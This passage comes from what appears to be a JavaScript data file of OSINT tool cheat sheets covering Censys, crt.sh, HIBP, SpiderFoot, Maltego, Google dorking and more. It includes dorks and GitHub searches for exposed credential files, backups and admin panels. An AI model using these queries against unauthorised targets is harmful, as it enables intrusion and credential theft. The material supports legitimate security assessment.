          { label: "Hosts by autonomous system", cmd: "autonomous_system.name: \"EXAMPLE-CORP\"" },
          { label: "Specific service on any port", cmd: "services.service_name: MONGODB" },
          { label: "Certificate search by common name", cmd: "parsed.names: example.com  (certificate index)" }
        ],
        sections: [
          {
            title: "Host Query Fields",
            type: "table",
            columns: ["Field", "Description"],
            rows: [
              ["ip", "IP address or CIDR range"],
              ["services.port", "Port number a service is listening on"],
              ["services.service_name", "Normalised protocol name — HTTP, SSH, MONGODB, ELASTICSEARCH"],
              ["services.software.product", "Identified product running on the service"],
              ["services.banner", "Raw banner text match"],
              ["services.http.response.html_title", "Page title of an HTTP response"],
              ["services.http.response.headers", "Match on specific response headers"],
              ["location.country", "Geolocation of the host"],
              ["autonomous_system.asn", "ASN number"],
              ["dns.names", "Hostnames associated with the IP"]
            ]
          },
          {
            title: "Certificate Query Fields",
            type: "table",
            columns: ["Field", "Description"],
            rows: [
              ["parsed.names", "Every DNS name in the certificate, including SANs"],
              ["parsed.subject.common_name", "The certificate's CN"],
              ["parsed.issuer.organization", "Issuing CA"],
              ["parsed.validity.end", "Expiry date — range queries work here"],
              ["parsed.fingerprint_sha256", "Exact certificate fingerprint, for pivoting to every host serving it"],
              ["parsed.subject.organization", "Organisation named in the certificate subject"]
            ]
          },
          {
            title: "Query Syntax",
            type: "table",
            columns: ["Operator", "Description"],
            rows: [
              ["and / or / not", "Boolean combination, uppercase or lowercase both accepted"],
              ["field: value", "Exact field match"],
              ["field: *partial*", "Wildcard match within a field"],
              ["field: {1 TO 100}", "Range query on numeric or date fields"],
              ["\"exact phrase\"", "Quoted phrase match"],
              ["same_service(...)", "Require multiple conditions to be true of the same service, not just the same host"]
            ]
          },
          {
            title: "CLI & API",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["pip install censys", "Install the official client library and CLI"],
              ["censys config", "Store your API ID and secret"],
              ["censys search '<query>' --index-type hosts", "Run a host search from the terminal"],
              ["censys search '<query>' --index-type certs", "Search the certificate index"],
              ["censys view <ip>", "Full record for a single host"],
              ["--pages -1", "Retrieve all result pages rather than just the first"],
              ["-f json -o out.json", "Write structured output to a file"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Certificate pivot to shadow infrastructure", cmd: "# 1. find the target's certificate fingerprint in the certs index\n#    parsed.names: example.com\n# 2. pivot to every host presenting it\ncensys search 'services.tls.certificates.leaf_data.fingerprint: <sha256>' --index-type hosts" },
              { label: "Enumerate an organisation's netblocks", cmd: "censys search 'autonomous_system.name: \"EXAMPLE-CORP\"' --index-type hosts --pages -1 -f json -o org_hosts.json" },
              { label: "Hunt exposed databases in scope", cmd: "censys search 'ip: 1.2.3.0/24 and (services.service_name: MONGODB or services.service_name: ELASTICSEARCH or services.service_name: REDIS)'" },
              { label: "Cross-check with Shodan", cmd: "censys search 'ip: 1.2.3.0/24' -f json -o censys.json\nshodan download shodan_res 'net:1.2.3.0/24'\n# compare the two IP/port sets — each finds hosts the other misses" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The certificate index is the reason to use Censys. Subject Alternative Names routinely leak internal hostnames that appear nowhere in public DNS.",
              "Free accounts have a monthly query quota. Refine queries in the web UI, where the result count is shown before you commit to pagination.",
              "same_service() matters more than it looks: without it, 'port 443 and product nginx' can match a host where those are two different services.",
              "Censys and Shodan disagree constantly. Treating either as complete is the most common mistake with both."
            ]
          }
        ]
      },
      {
        id: "crtsh",
        name: "crt.sh",
        url: "https://crt.sh/",
        description: "Certificate transparency log search — free, keyless subdomain discovery.",
        brief: "Every publicly trusted TLS certificate is published to certificate transparency logs, and crt.sh makes those logs searchable. Because organisations request certificates for internal-sounding hostnames all the time, CT logs are the single most productive free source of subdomains — no API key, no rate limit worth worrying about, and complete historical coverage.\n\nIt is passive by definition: you are reading a public log, not touching the target.",
        quickReference: [
          { label: "All certificates for a domain and its subdomains", cmd: "https://crt.sh/?q=%25.example.com" },
          { label: "JSON output for scripting", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json'" },
          { label: "Clean subdomain list in one line", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u" },
          { label: "Search by organisation name", cmd: "https://crt.sh/?O=Example+Corp" },
          { label: "Look up one certificate by SHA-256", cmd: "https://crt.sh/?sha256=<hash>" }
        ],
        sections: [
          {
            title: "Search Parameters",
            type: "table",
            columns: ["Parameter", "Description"],
            rows: [
              ["?q=example.com", "Identity search — matches CN and SANs"],
              ["?q=%.example.com", "Wildcard search; %25 is the URL-encoded % that matches any subdomain"],
              ["?O=Example+Corp", "Search by the organisation field in the certificate subject"],
              ["?CN=mail.example.com", "Search by exact common name"],
              ["?id=<number>", "Fetch a specific crt.sh certificate record"],
              ["?sha256=<hash>", "Look up a certificate by fingerprint"],
              ["&output=json", "Return JSON instead of HTML — append to any query"],
              ["&exclude=expired", "Omit expired certificates from results"],
              ["&deduplicate=Y", "Collapse duplicate log entries for the same certificate"]
            ]
          },
          {
            title: "Reading the Results",
            type: "table",
            columns: ["Column", "Meaning"],
            rows: [
              ["crt.sh ID", "crt.sh's internal record ID — click through for the full certificate"],
              ["Logged At", "When the certificate entered the CT log, not when it was issued"],
              ["Not Before / Not After", "Validity window; expired entries still reveal past infrastructure"],
              ["Common Name", "Primary hostname the certificate was issued for"],
              ["Matching Identities", "Every name on the certificate, including all SANs — this is where the subdomains are"],
              ["Issuer Name", "The CA; a sudden change of CA often marks a migration worth noting"]
            ]
          },
          {
            title: "Why It Works",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Certificate Transparency", "Browsers require publicly trusted certificates to be logged to public, append-only CT logs"],
              ["Why internal names leak", "Teams request certificates for dev, staging, VPN, and admin hosts using the same public CA workflow"],
              ["Wildcards hide detail", "A *.example.com certificate reveals nothing beyond the wildcard — heavy wildcard use reduces yield"],
              ["Historical coverage", "Expired certificates stay in the log permanently, exposing decommissioned and legacy hosts"],
              ["Alternative front-ends", "certspotter and Facebook's CT tool index the same logs with slightly different coverage"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Extract a deduplicated subdomain list", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' \\\n  | jq -r '.[].name_value' \\\n  | sed 's/\\*\\.//g' | tr '[:upper:]' '[:lower:]' \\\n  | sort -u > crtsh_subs.txt\nwc -l crtsh_subs.txt" },
              { label: "Check which of them are actually live", cmd: "cat crtsh_subs.txt | httpx -silent -status-code -title" },
              { label: "Organisation-wide sweep across root domains", cmd: "curl -s 'https://crt.sh/?O=Example+Corp&output=json' \\\n  | jq -r '.[].name_value' | sed 's/\\*\\.//g' \\\n  | rev | cut -d. -f1,2 | rev | sort -u" },
              { label: "Spot recently issued certificates", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' \\\n  | jq -r '.[] | \"\\(.entry_timestamp) \\(.name_value)\"' \\\n  | sort -r | head -20" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is the first thing to run on any new domain. It costs nothing, takes seconds, and often returns the best subdomain list you will get.",
              "The site times out on very large domains. Retry, or query a specific CT log front-end instead of the aggregate view.",
              "Names from CT logs are historical, not live. Always resolve them before treating them as active infrastructure.",
              "Certificates issued for internal-only hostnames are a finding in themselves — flag them as information disclosure.",
              "crt.sh also serves a Postgres interface at crt.sh:5432 (database certwatch, user guest) for complex queries the web UI cannot express."
            ]
          }
        ]
      },
      {
        id: "dnsdumpster",
        name: "DNSDumpster",
        url: "https://dnsdumpster.com/",
        description: "Free DNS reconnaissance with a visual map of a domain's infrastructure.",
        brief: "DNSDumpster takes a domain and returns its DNS footprint — nameservers, MX records, TXT records, and discovered hosts with their IPs, ASNs, and reverse DNS — plus a generated graph showing how they connect.\n\nIt is not the deepest source, but it is free, instant, requires no account, and the visual map is genuinely useful for orienting yourself on an unfamiliar target before deciding where to dig.",
        quickReference: [
          { label: "Run a lookup", cmd: "dnsdumpster.com — enter the domain, no account needed" },
          { label: "Same data via CLI", cmd: "theHarvester -d example.com -b dnsdumpster" },
          { label: "Export", cmd: "Download the results as XLSX or grab the generated domain map image" },
          { label: "Related tooling", cmd: "hackertarget.com/dns-lookup — same operator, individual lookups" }
        ],
        sections: [
          {
            title: "What It Returns",
            type: "table",
            columns: ["Section", "Contents"],
            rows: [
              ["DNS Servers", "Authoritative nameservers with IP, ASN, and hosting provider"],
              ["MX Records", "Mail servers with priority — reveals the mail provider (Google, Microsoft, self-hosted)"],
              ["TXT Records", "SPF, DMARC, DKIM, and verification tokens for third-party services"],
              ["Host Records (A)", "Discovered subdomains with IP, reverse DNS, ASN, and detected HTTP banner"],
              ["Domain Map", "A generated graph image of how hosts, netblocks, and providers relate"],
              ["XLSX export", "The host table as a spreadsheet for reporting"]
            ]
          },
          {
            title: "Reading TXT Records",
            type: "table",
            columns: ["Record type", "What it tells you"],
            rows: [
              ["v=spf1 include:...", "Every third-party service authorised to send mail as the domain — a supply-chain map"],
              ["v=DMARC1 p=none", "DMARC in monitor-only mode; the domain is spoofable in practice"],
              ["google-site-verification", "Confirms Google Workspace usage"],
              ["MS=ms########", "Confirms Microsoft 365 tenancy"],
              ["atlassian-domain-verification", "Confirms Jira/Confluence Cloud usage"],
              ["Vendor tokens generally", "Each one names a SaaS product in use — valuable for phishing pretext and third-party risk"]
            ]
          },
          {
            title: "Interpreting the Host Table",
            type: "table",
            columns: ["Column", "Why it matters"],
            rows: [
              ["IP + reverse DNS", "Reverse DNS often names the host's real purpose (vpn, jenkins, backup)"],
              ["ASN / Provider", "Hosts outside the main provider's range are the interesting ones — often shadow IT"],
              ["HTTP banner", "Immediate signal of what is running before you touch the host"],
              ["Netblock grouping", "Clusters of adjacent IPs suggest a netblock worth enumerating fully"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Fast orientation on a new target", cmd: "1. Run the domain through dnsdumpster.com\n2. Note the mail provider from MX and the SaaS stack from TXT\n3. Identify any host outside the main ASN — start there\n4. Feed the host list into httpx for live status" },
              { label: "Follow up on the netblocks it reveals", cmd: "# take the ASN from the results, then:\namass intel -asn <asn>\nshodan search 'net:<netblock>'" },
              { label: "Turn SPF into a vendor list", cmd: "dig +short TXT example.com | grep spf1\n# each include: is a third party authorised to send as the domain" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Coverage is shallower than Amass or crt.sh — treat it as a fast orientation pass, not a complete enumeration.",
              "The free tier limits lookups per day per IP. It is a starting point, not a bulk tool.",
              "The TXT record section is the most underrated part: it maps the organisation's SaaS dependencies in one screenshot.",
              "The domain map image is worth keeping for reports — it communicates infrastructure layout to non-technical readers better than a table."
            ]
          }
        ]
      },
      {
        id: "haveibeenpwned",
        name: "Have I Been Pwned",
        url: "https://haveibeenpwned.com/",
        description: "Checks whether an address, domain, or password appears in known data breaches.",
        brief: "Have I Been Pwned aggregates data from publicly known breaches and lets you check whether an email address, a whole domain, or a specific password appears in them. It is the reference source for breach exposure — authoritative, ethically run, and the one everyone else's tooling cites.\n\nFor an organisation, the domain search is the important feature: it lists every breached address on a domain you control and prove ownership of, which is the fastest way to size credential-stuffing risk.",
        quickReference: [
          { label: "Check one address", cmd: "haveibeenpwned.com — enter the address" },
          { label: "Check a password safely", cmd: "haveibeenpwned.com/Passwords — uses k-anonymity, the password never leaves your browser intact" },
          { label: "API breach lookup", cmd: "curl -H \"hibp-api-key: <key>\" https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com" },
          { label: "Password range API — free, no key", cmd: "curl https://api.pwnedpasswords.com/range/<first5-of-sha1>" },
          { label: "Domain-wide report", cmd: "haveibeenpwned.com/DomainSearch — requires domain ownership verification" }
        ],
        sections: [
          {
            title: "API Endpoints",
            type: "table",
            columns: ["Endpoint", "Returns"],
            rows: [
              ["/api/v3/breachedaccount/<email>", "Breaches containing that address; add ?truncateResponse=false for full detail"],
              ["/api/v3/pasteaccount/<email>", "Pastes (Pastebin and similar) containing the address"],
              ["/api/v3/breaches", "Every breach in the system, with dates and compromised data classes"],
              ["/api/v3/breach/<name>", "Detail on a single named breach"],
              ["/api/v3/breacheddomain/<domain>", "All breached addresses on a verified domain"],
              ["api.pwnedpasswords.com/range/<prefix>", "Password hash suffixes and counts — free and unauthenticated"]
            ]
          },
          {
            title: "The k-Anonymity Model",
            type: "table",
            columns: ["Step", "What happens"],
            rows: [
              ["1. Hash locally", "SHA-1 the password on your machine"],
              ["2. Send 5 characters", "Only the first 5 hex characters of the hash are sent to the API"],
              ["3. Receive a bucket", "The API returns every hash suffix sharing that prefix, typically several hundred"],
              ["4. Match locally", "You compare the remaining suffix yourself"],
              ["Result", "HIBP never learns the password or even the full hash — safe to use in automated checks"]
            ]
          },
          {
            title: "Reading a Breach Record",
            type: "table",
            columns: ["Field", "Why it matters"],
            rows: [
              ["BreachDate", "When the breach occurred — a password changed after this date is not exposed by it"],
              ["AddedDate", "When HIBP published it; the gap from BreachDate is often years"],
              ["DataClasses", "Exactly what was exposed — passwords, addresses, security questions, payment data"],
              ["IsVerified", "Whether HIBP confirmed the data's authenticity; unverified entries need caution"],
              ["IsSensitive", "Sensitive breaches are excluded from public search and only shown to verified owners"],
              ["PwnCount", "Scale of the breach, useful context for a report"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Check a password without exposing it", cmd: "PASS='hunter2'\nHASH=$(printf '%s' \"$PASS\" | sha1sum | tr 'a-z' 'A-Z' | cut -d' ' -f1)\ncurl -s \"https://api.pwnedpasswords.com/range/${HASH:0:5}\" \\\n  | grep -i \"${HASH:5}\"\n# a match shows how many times it has appeared in breaches" },
              { label: "Assess exposure for a domain you own", cmd: "# verify the domain in the HIBP portal, then:\ncurl -s -H \"hibp-api-key: $HIBP_KEY\" \\\n  https://haveibeenpwned.com/api/v3/breacheddomain/example.com | jq" },
              { label: "Check a list of addresses", cmd: "for e in $(cat emails.txt); do\n  curl -s -H \"hibp-api-key: $HIBP_KEY\" \\\n    \"https://haveibeenpwned.com/api/v3/breachedaccount/$e\" \\\n    | jq -r --arg e \"$e\" '.[]? | \"\\($e) \\(.Name)\"'\n  sleep 2   # respect the rate limit\ndone" },
              { label: "Build the exposure picture", cmd: "# 1. HIBP -> which breaches include the address\n# 2. holehe -> which services it is registered on now\n# 3. overlap between the two is where credential stuffing actually lands" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The email search API requires a paid key; the password range API is free and unauthenticated, which is usually the part you want to automate.",
              "HIBP tells you an address appeared in a breach, never the password itself. Anyone offering that is selling stolen credentials — do not go there.",
              "Compare BreachDate against the last known password change before calling an account exposed. Old breaches are often already remediated.",
              "Domain search needs verified ownership. That is a feature, not an obstacle — it is what keeps the tool ethical.",
              "Respect the documented rate limit. Hammering the API gets your key revoked and is discourteous to a free public service."
            ]
          }
        ]
      },
      {
        id: "maltego",
        name: "Maltego",
        url: "https://www.maltego.com/",
        description: "Link analysis platform that turns OSINT findings into a visual entity graph.",
        brief: "Maltego is a graph-based link analysis tool. You place an entity on a canvas — a domain, person, email, IP — and run transforms that query data sources and draw the results as connected nodes. Repeat, and relationships that were invisible in a list of text findings become obvious in the graph.\n\nIts real strength is not collection but comprehension. When an investigation spans dozens of domains, people, and addresses, the graph is what shows you which node everything actually hinges on.",
        quickReference: [
          { label: "Start an investigation", cmd: "New graph -> drag an entity onto the canvas -> right-click -> run a transform" },
          { label: "Run every transform in a set", cmd: "Right-click entity -> Transform Set -> All Transforms" },
          { label: "Community edition limit", cmd: "12 results per transform, non-commercial use" },
          { label: "Add data sources", cmd: "Transform Hub -> install a hub item and enter its API key" },
          { label: "Export findings", cmd: "Export graph as image, or entities as CSV for a report" }
        ],
        sections: [
          {
            title: "Entity Types",
            type: "table",
            columns: ["Entity", "Typical use"],
            rows: [
              ["Domain", "Starting point for infrastructure investigations"],
              ["DNS Name", "Individual hostnames discovered during enumeration"],
              ["IP Address / Netblock / AS", "Infrastructure layer of the graph"],
              ["Email Address", "Bridge between the infrastructure and people halves of a graph"],
              ["Person / Alias", "Named individuals and their handles"],
              ["Phone Number", "Links people to registrations and directories"],
              ["Organisation / Company", "Anchors corporate structure and WHOIS pivots"],
              ["Document / URL", "Files and pages, often the source of metadata pivots"],
              ["Custom entities", "Define your own types for case-specific data"]
            ]
          },
          {
            title: "Transforms",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What a transform is", "A query that takes one entity and returns related entities from a data source"],
              ["Standard transforms", "DNS, WHOIS, and search-based transforms included by default"],
              ["Transform Hub", "Marketplace of third-party transform sets — Shodan, VirusTotal, HIBP, Censys, and many more"],
              ["Local transforms", "Scripts you write yourself, run on your machine against your own data"],
              ["Machines", "Saved sequences of transforms that run automatically — the closest thing to a playbook"],
              ["Transform limits", "Community edition caps results per transform; commercial tiers raise or remove that"]
            ]
          },
          {
            title: "Useful Hub Items",
            type: "table",
            columns: ["Hub item", "What it adds"],
            rows: [
              ["Shodan", "Exposed services and banners for IP entities"],
              ["VirusTotal", "Passive DNS, related samples, and reputation data"],
              ["Have I Been Pwned", "Breach exposure for email entities"],
              ["Censys", "Certificate and host data"],
              ["Social Links / Pipl (commercial)", "People-focused enrichment; licensing varies"],
              ["OpenCTI / MISP", "Bridges the graph to threat-intelligence platforms"],
              ["WhoisXML", "Historical and reverse WHOIS at scale"]
            ]
          },
          {
            title: "Working With the Graph",
            type: "table",
            columns: ["Feature", "Description"],
            rows: [
              ["Layouts", "Block, hierarchical, circular, and organic — organic best reveals clusters"],
              ["Entity weight", "Transforms assign weights; heavier nodes are more strongly connected"],
              ["Bookmarks & notes", "Annotate nodes with findings so the graph is self-documenting"],
              ["Collections", "Groups of similar nodes collapse to keep large graphs readable"],
              ["Detail view", "Every property returned by a transform, per entity"],
              ["Graph merging", "Combine graphs from different phases of an investigation"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Domain-first infrastructure map", cmd: "1. Drop the Domain entity on the canvas\n2. Run: To DNS Names, To MX/NS records, To Website\n3. On the resulting DNS names: To IP Address\n4. On the IPs: To Netblock, To AS, then the Shodan transforms\n5. Switch to organic layout — the clusters are the separate hosting environments" },
              { label: "People-first investigation", cmd: "1. Drop the Person or Email Address entity\n2. Run HIBP transforms for breach exposure\n3. To Alias / To Social Media Profile for handles\n4. To Phone Number and To Website\n5. Follow each alias back out for cross-platform confirmation" },
              { label: "Import external tool output", cmd: "# Amass can export directly to a Maltego-compatible format\namass viz -maltego -d example.com -dir ./engagement\n# then import the file as entities and continue in the graph" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Community edition is free and genuinely usable for learning; the per-transform result cap is the main constraint.",
              "Run transforms deliberately rather than 'all transforms' on everything — an unfocused graph becomes unreadable within a few hops.",
              "Maltego is a visualisation and correlation layer, not a data source. Its output is only as good as the transforms and keys behind it.",
              "The graph is the deliverable clients remember. Lay it out and annotate it before exporting — a tidy graph explains an engagement better than pages of text.",
              "Keep one graph per engagement, and mind that transform queries send entity values to third-party APIs — that has scope and privacy implications."
            ]
          }
        ]
      },
      {
        id: "spiderfoot",
        name: "SpiderFoot",
        url: "https://github.com/smicallef/spiderfoot",
        description: "Automated OSINT engine that correlates 200+ data sources into one scan.",
        brief: "SpiderFoot automates the whole reconnaissance pipeline. You give it a seed target — domain, IP, email, name, phone, or username — and it runs 200+ modules that query public sources, resolve what they find, and feed those results back in as new targets, recursively, until the scope is exhausted.\n\nIt is the tool for breadth without manual effort. The web UI gives you a browsable, correlated result set, and its correlation rules flag the findings that actually matter rather than leaving you to read thousands of rows.",
        quickReference: [
          { label: "Start the web UI", cmd: "python3 ./sf.py -l 127.0.0.1:5001" },
          { label: "CLI scan with a module set", cmd: "python3 ./sf.py -s example.com -t DOMAIN_NAME -u footprint" },
          { label: "Passive-only scan", cmd: "python3 ./sf.py -s example.com -u passive" },
          { label: "List all modules", cmd: "python3 ./sf.py -M" },
          { label: "Run specific modules", cmd: "python3 ./sf.py -s example.com -m sfp_crt,sfp_dnsresolve,sfp_shodan" }
        ],
        sections: [
          {
            title: "Scan Use Cases",
            type: "table",
            columns: ["Use case", "What it runs"],
            rows: [
              ["all", "Every module — maximum coverage, longest runtime, noisiest"],
              ["footprint", "Map the target's externally visible network footprint"],
              ["investigate", "Focus on reputation and malicious-association checks"],
              ["passive", "Only modules that never touch the target directly — safe pre-authorisation"],
              ["Custom module set", "Hand-pick modules with -m for a precise, fast scan"]
            ]
          },
          {
            title: "Target Types",
            type: "table",
            columns: ["Type", "Example seed"],
            rows: [
              ["DOMAIN_NAME", "example.com"],
              ["INTERNET_NAME", "www.example.com"],
              ["IP_ADDRESS / NETBLOCK_OWNER", "1.2.3.4 or 1.2.3.0/24"],
              ["EMAILADDR", "user@example.com"],
              ["HUMAN_NAME", "\"John Doe\" — quoted"],
              ["USERNAME", "johndoe"],
              ["PHONE_NUMBER", "+911234567890"],
              ["BITCOIN_ADDRESS", "For cryptocurrency-linked investigations"],
              ["BGP_AS_OWNER", "An ASN number"]
            ]
          },
          {
            title: "Notable Modules",
            type: "table",
            columns: ["Module", "Purpose"],
            rows: [
              ["sfp_crt", "Certificate transparency subdomain discovery"],
              ["sfp_dnsresolve / sfp_dnsbrute", "Resolution and DNS brute forcing"],
              ["sfp_shodan / sfp_censys", "Exposed service data (API keys required)"],
              ["sfp_hunter / sfp_emailrep", "Email discovery and reputation"],
              ["sfp_haveibeenpwned", "Breach exposure for discovered addresses"],
              ["sfp_github", "Searches public repositories for target references and leaked keys"],
              ["sfp_pastesites", "Looks for the target in paste sites"],
              ["sfp_whatweb / sfp_webframework", "Technology fingerprinting on discovered web hosts"],
              ["sfp_tool_*", "Wrappers around local binaries — nmap, nbtscan, whatweb, dnstwist"],
              ["sfp_accounts", "Username enumeration across social platforms"]
            ]
          },
          {
            title: "Correlation Rules",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What they do", "Post-scan rules that surface meaningful patterns from raw results"],
              ["Examples", "Hosts with expired certificates, cloud storage exposed publicly, credentials found in code, outdated software versions"],
              ["Why they matter", "A large scan produces tens of thousands of rows; correlations are the shortlist worth reading first"],
              ["Custom rules", "Defined in YAML under the correlations/ directory and easy to extend"],
              ["Viewing", "The Correlations tab of a completed scan in the web UI"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Passive footprinting before authorisation lands", cmd: "python3 ./sf.py -s example.com -t DOMAIN_NAME -u passive \\\n  -o csv > passive_scan.csv" },
              { label: "Full authorised footprint scan", cmd: "python3 ./sf.py -l 127.0.0.1:5001\n# in the UI: New Scan -> seed example.com -> use case 'footprint'\n# then read the Correlations tab before anything else" },
              { label: "Targeted, fast scan", cmd: "python3 ./sf.py -s example.com \\\n  -m sfp_crt,sfp_dnsresolve,sfp_hunter,sfp_haveibeenpwned,sfp_github \\\n  -o json > targeted.json" },
              { label: "Person-centric scan", cmd: "python3 ./sf.py -s \"John Doe\" -t HUMAN_NAME -u all\n# and separately on the username and email as distinct seeds" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Configure API keys in Settings before the first real scan — without them a large fraction of modules return nothing and the scan looks misleadingly empty.",
              "'all' with an unrestricted scope can wander far beyond what you are authorised to touch. Set scope limits deliberately in the scan settings.",
              "Read the Correlations tab first. Reading raw results top to bottom is how people burn hours on a SpiderFoot scan.",
              "Passive use case is genuinely passive and is the right default until you have written authorisation.",
              "Scan data is stored in a local SQLite database, so results persist and can be re-queried and compared between runs."
            ]
          }
        ]
      },
      {
        id: "google-dorking",
        name: "Google Dorking",
        url: "https://www.exploit-db.com/google-hacking-database",
        description: "Advanced search-engine operators for finding exposed files, panels, and data.",
        brief: "Google dorking is the practice of using advanced search operators to find things the search engine indexed but nobody intended to publish: configuration files, database backups, login panels, internal documents, and credentials in code.\n\nThere is no tool to install — the technique is the tool. It is entirely passive (you query Google, not the target) and remains one of the highest yield-per-effort activities in reconnaissance. The Google Hacking Database catalogues thousands of proven queries.",
        quickReference: [
          { label: "Everything indexed on a domain", cmd: "site:example.com" },
          { label: "Find exposed documents", cmd: "site:example.com filetype:pdf | filetype:xlsx | filetype:docx" },
          { label: "Find login pages", cmd: "site:example.com inurl:login | inurl:admin | inurl:signin" },
          { label: "Find subdomains via search", cmd: "site:*.example.com -site:www.example.com" },
          { label: "Directory listings", cmd: "site:example.com intitle:\"index of\"" }
        ],
        sections: [
          {
            title: "Core Operators",
            type: "table",
            columns: ["Operator", "Description"],
            rows: [
              ["site:", "Restrict results to a domain or subdomain"],
              ["inurl:", "The URL contains the term"],
              ["intitle:", "The page title contains the term"],
              ["intext:", "The page body contains the term"],
              ["filetype: / ext:", "Restrict to a file extension"],
              ["cache:", "Google's cached copy of a page"],
              ["related:", "Sites Google considers similar"],
              ["allinurl: / allintitle:", "All listed terms must appear in the URL or title"],
              ["-term", "Exclude results containing the term"],
              ["\"exact phrase\"", "Match the phrase exactly"],
              ["|  or  OR", "Boolean OR between terms"],
              ["*", "Wildcard for a single word"]
            ]
          },
          {
            title: "Exposed Files",
            type: "table",
            columns: ["Query", "What it finds"],
            rows: [
              ["site:example.com ext:sql | ext:db | ext:bak", "Database dumps and backup files"],
              ["site:example.com ext:log | ext:conf | ext:cnf | ext:ini", "Configuration and log files"],
              ["site:example.com ext:env | \"DB_PASSWORD\"", "Environment files containing credentials"],
              ["site:example.com filetype:xls | filetype:xlsx \"internal\"", "Spreadsheets not meant to be public"],
              ["site:example.com ext:txt inurl:robots", "robots.txt files, which often list paths meant to stay hidden"],
              ["site:example.com \"index of\" backup", "Open directories holding backups"],
              ["site:example.com ext:pdf \"confidential\"", "Documents marked confidential but publicly indexed"]
            ]
          },
          {
            title: "Panels & Infrastructure",
            type: "table",
            columns: ["Query", "What it finds"],
            rows: [
              ["site:example.com inurl:admin | inurl:administrator", "Administrative interfaces"],
              ["site:example.com intitle:\"phpMyAdmin\"", "Exposed database management panels"],
              ["site:example.com inurl:wp-admin | inurl:wp-content", "WordPress installations"],
              ["site:example.com intitle:\"Dashboard\" inurl:8080", "Management dashboards on alternate ports"],
              ["site:example.com inurl:jenkins | inurl:jira | inurl:gitlab", "Internal developer tooling reachable publicly"],
              ["site:example.com inurl:\"/api/\" | inurl:swagger | inurl:graphql", "API documentation and interactive explorers"],
              ["site:example.com intitle:\"index of\" \".git\"", "Exposed git repositories"]
            ]
          },
          {
            title: "People & Third-Party Sources",
            type: "table",
            columns: ["Query", "Purpose"],
            rows: [
              ["site:linkedin.com \"Example Corp\"", "Employee enumeration for org-structure mapping"],
              ["site:github.com \"example.com\"", "Code referencing the target's domain — often with endpoints or keys"],
              ["site:pastebin.com \"example.com\"", "Pasted data mentioning the target"],
              ["site:trello.com | site:docs.google.com \"example corp\"", "Publicly shared boards and documents"],
              ["site:s3.amazonaws.com \"example\"", "Public S3 buckets bearing the target's name"],
              ["\"@example.com\" -site:example.com", "Email addresses published on third-party sites"]
            ]
          },
          {
            title: "Other Search Engines",
            type: "table",
            columns: ["Engine", "Why use it"],
            rows: [
              ["Bing", "Supports ip: to find all sites on an IP — Google has no equivalent"],
              ["DuckDuckGo", "No personalisation and lighter rate limiting"],
              ["Yandex", "Distinct index; noticeably better for some regions and for image search"],
              ["Baidu", "The practical choice for Chinese-language targets"],
              ["GitHub code search", "Its own operators (org:, path:, language:) and the best source for leaked keys"],
              ["Grep.app / SearchCode", "Search across public code without GitHub's rate limits"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Structured first pass on a domain", cmd: "site:example.com                                   # scale of the footprint\nsite:*.example.com -site:www.example.com           # subdomains\nsite:example.com filetype:pdf OR filetype:docx     # documents\nsite:example.com inurl:admin OR inurl:login        # panels\nsite:example.com intitle:\"index of\"                # open directories" },
              { label: "Hunt credentials in public code", cmd: "site:github.com \"example.com\" password\nsite:github.com \"example.com\" api_key\n# then repeat on GitHub code search with org: and path: filters" },
              { label: "Automate carefully", cmd: "# googlesearch-python or a paid SERP API — scraping Google directly\n# gets you captcha'd fast and violates their terms\npip install googlesearch-python" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Searching is passive; opening what you find is not. A dork that reveals an exposed admin panel does not authorise you to log into it.",
              "Automated dorking trips Google's bot detection quickly. Space queries out or use a proper SERP API.",
              "The Google Hacking Database at Exploit-DB is the canonical catalogue of proven queries — start there rather than inventing dorks from scratch.",
              "Findings can be stale. Check the cached date and confirm the resource is still live before reporting it.",
              "Try the same query on Bing and Yandex. Index coverage differs enough that each regularly finds what the others missed."
            ]
          }
        ]
      },
      {
        id: "wayback-machine",
        name: "Wayback Machine",
        url: "https://web.archive.org/",
        description: "Historical web archive — recovers removed pages, old endpoints, and deleted content.",
        brief: "The Internet Archive's Wayback Machine has been snapshotting the web since 1996. For reconnaissance that means every page, script, and parameter a site ever exposed is potentially still readable, including the ones deliberately removed.\n\nThe highest-value use is endpoint discovery: the archive's URL index returns every path it ever crawled for a domain, which routinely surfaces old API endpoints, admin paths, and parameters that are still live but no longer linked anywhere.",
        quickReference: [
          { label: "Every archived URL for a domain", cmd: "curl -s 'http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey'" },
          { label: "Same thing, one tool", cmd: "waybackurls example.com" },
          { label: "Browse snapshots", cmd: "web.archive.org/web/*/example.com" },
          { label: "Snapshot nearest a date", cmd: "web.archive.org/web/20200101/https://example.com" },
          { label: "Archived robots.txt (a path goldmine)", cmd: "web.archive.org/web/*/example.com/robots.txt" }
        ],
        sections: [
          {
